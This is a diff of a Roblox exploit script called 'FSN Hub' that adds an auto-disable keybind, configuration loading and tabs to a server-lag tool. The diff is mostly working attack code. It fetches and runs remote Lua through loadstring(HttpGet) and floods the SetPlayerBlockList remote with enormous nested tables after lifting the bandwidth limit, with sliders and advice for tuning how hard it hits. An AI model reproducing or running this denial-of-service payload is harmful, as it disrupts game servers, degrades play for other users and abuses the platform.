@@ -1,4 +1,8 @@
-local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local RayfieldFolder = "Rayfield"
+local ConfigurationFolder = RayfieldFolder.."/Configurations"
+local ConfigurationExtension = ".rfld"
+
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Fusiom/rayfieldlib/main/source'))()
 
 local Window = Rayfield:CreateWindow({
 	Name = "FSN Hub",
@@ -11,7 +15,7 @@ local Window = Rayfield:CreateWindow({
 	},
         Discord = {
         	Enabled = false,
-        	Invite = "sirius", 
+        	Invite = "", 
         	RememberJoins = true 
         },
 	KeySystem = false,
@@ -22,21 +26,23 @@ local Window = Rayfield:CreateWindow({
 local Players = game:GetService("Players")
 
 local username = Players.LocalPlayer.DisplayName
-local titleusername = "Welcome, " ..username
+local titleusername = "Welcome, "..username.."."
 
 Rayfield:Notify({
     Title = titleusername,
     Content = "This is a beta version of the script. Some aspects are yet to change. Use with caution.",
     Duration = 5,
-    Image = 4483362458
+    Image = 4400700942
 })
 
 -- Info
 
 -- Tabs
 
-local AutoLag = Window:CreateTab("Auto Lag", 4483362458) 
+local AutoLag = Window:CreateTab("Lag", 4483362458) 
+local LagTab = Window:CreateTab("Auto Lag", 4483362458) 
 local Info = Window:CreateTab("Info", 4483362458) 
+local Presets = Window:CreateTab("Presets", 4483362458) 
 
 -- AutoLag
 
@@ -108,7 +114,7 @@ local Toggle = AutoLag:CreateToggle({
 local toggled2 = false
 local Keybind = AutoLag:CreateKeybind({
 	Name = "Toggle Bind",
-	CurrentKeybind = "Q",
+	CurrentKeybind = "None",
 	HoldToInteract = false,
 	Flag = "Keybind1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
 	Callback = function(Keybind)
@@ -122,14 +128,20 @@ local Keybind = AutoLag:CreateKeybind({
 	end,
 })
 
-local Label = AutoLag:CreateLabel("Auto Disable")
+local Label = AutoLag:CreateLabel("Auto Disable") 
 
+-- Auto Disable
+
+local toggled3 = false
+debounce = false
 local Button = AutoLag:CreateButton({
 	Name = "Start",
 	Callback = function()
 		Toggled = true
 		    coroutine.resume(coroutine.create(function()
+		        if debounce == true then return end
 		        local counter = 0
+		        debounce = true
 		        while true do
                     wait(intervalValue)
                     counter = counter + 1
@@ -183,7 +195,77 @@ local Button = AutoLag:CreateButton({
                     bomb(p1, p2) 
                     
 		        end
+		        debounce = false
 		    end))
+	end,
+})
+local Keybind = AutoLag:CreateKeybind({
+	Name = "Toggle Auto Disable",
+	CurrentKeybind = "None",
+	HoldToInteract = false,
+	Flag = "Keybind2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Callback = function(Keybind)
+	    Toggled = true
+		    coroutine.resume(coroutine.create(function()
+		        if debounce == true then return end
+		        local counter = 0
+		        debounce = true
+		        while true do
+                    wait(intervalValue)
+                    counter = counter + 1
+                    if counter == tonumber(loopAmount) then
+                        break
+                    end
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                    local function getmaxvalue(val)
+                       local mainvalueifonetable = 499999
+                       if type(val) ~= "number" then
+                           return nil
+                       end
+                       local calculateperfectval = (mainvalueifonetable/(val+2))
+                       return calculateperfectval
+                    end
+                    
+                    local function bomb(tableincrease, tries)
+                    local maintable = {}
+                    local spammedtable = {}
+                    
+                    table.insert(spammedtable, {})
+                    z = spammedtable[1]
+                    
+                    for i = 1, tableincrease do
+                        local tableins = {}
+                        table.insert(z, tableins)
+                        z = tableins
+                    end
+                    
+                    local calculatemax = getmaxvalue(tableincrease)
+                    local maximum
+                    
+                    if calculatemax then
+                         maximum = calculatemax
+                         else
+                         maximum = 999999
+                    end
+                    
+                    for i = 1, maximum do
+                         table.insert(maintable, spammedtable)
+                    end
+                    
+                    for i = 1, tries do
+                         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                    end
+                    end
+                    
+                    local p1 = tonumber(impactValue)
+                    local p2 = tonumber(rateValue)
+                    print(p1, p2)
+                    bomb(p1, p2) 
+                    
+		        end
+		        debounce = false
+		    end))
+	    
 	end,
 })
 local Slider = AutoLag:CreateSlider({
@@ -199,6 +281,8 @@ local Slider = AutoLag:CreateSlider({
 })
 
 local Label = AutoLag:CreateLabel("Settings")
+
+-- Settings
 
 local Slider2 = AutoLag:CreateSlider({
 	Name = "Packet Impact",
@@ -234,8 +318,31 @@ local Slider4 = AutoLag:CreateSlider({
 	end,
 })
 
+if not isfile(ConfigurationFolder.."/lagscripthub"..ConfigurationExtension) then 
+    Slider:Set(1) 
+    Slider2:Set(100) 
+	Slider3:Set(1)
+	Slider4:Set(1) 
+	
+	Rayfield:Notify({
+    Title = "Default settings loaded!",
+    Content = "It seems you don't have a configuration file yet, so the default settings have been applied.",
+    Duration = 6,
+    Image = 3944680095
+})
+else
+    Rayfield:Notify({
+    Title = "Settings loaded!",
+    Content = "Settings were applied from a previous session.",
+    Duration = 6,
+    Image = 3944680095
+})
+end
 
-local Paragraph = Info:CreateParagraph({Title = "Settings", Content = "The best settings (if you don't know what you're doing) are:\n\nPacket Impact: 100 Impact\nPacket Rate: 2 Packets\nInterval: 0.7 Seconds\n\nLoop Amount: 20"})
+-- Info
+
+local Paragraph = Info:CreateParagraph({Title = "Settings", Content = "Don't touch the settings from the default preset too much unless you know what you're doing. If you would like to get a greater/lesser impact from the lag, change the packet impact."})
+--[[
 local Button = Info:CreateButton({
 	Name = "Apply these settings",
 	Callback = function()
@@ -245,6 +352,16 @@ local Button = Info:CreateButton({
 		Slider4:Set(0.7) 
 	end,
 })
+]]
 Paragraph = Info:CreateParagraph({Title = "Beta", Content = "This script is in beta and purely made for the rush of dopamine I get for actually finishing something on-time. If it doesn't work how you expect, blame adhd."})
+Paragraph = Info:CreateParagraph({Title = "Warning", Content = "It's generally not a good idea to go past 1 packet on the packet rate or 250 on packet impact. Make sure to either use the default preset or find a preset that works well for you."})
+
+-- Presets
+
+local Label = Presets:CreateLabel("Coming soon!")
+
+-- Actual auto lag 
+
+local Label = LagTab:CreateLabel("Coming soon!")
 
 Rayfield:LoadConfiguration()
